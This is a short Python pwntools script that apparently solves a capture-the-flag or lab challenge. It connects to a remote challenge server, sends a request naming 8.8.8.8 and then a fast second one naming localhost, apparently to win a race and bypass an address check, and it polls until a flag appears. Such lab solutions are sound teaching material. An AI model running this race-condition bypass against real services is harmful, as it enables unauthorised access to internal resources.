from pwn import *
import time

connection = remote('up.zoolab.org', 10932)
# connection = process('./cha_2', shell=False)

connection.sendline(b'g\n8.8.8.8/10000\nv')
print(connection.recv().decode())
time.sleep(0.001)
connection.sendline(b'g\nlocalhost/10000\nv')
print(connection.recv().decode())

while True:
    time.sleep(10)
    connection.sendline(b'v')
    result = connection.recv()
    print(result.decode())
    if b"FLAG" in result:
        print(result.decode())
        break

connection.close()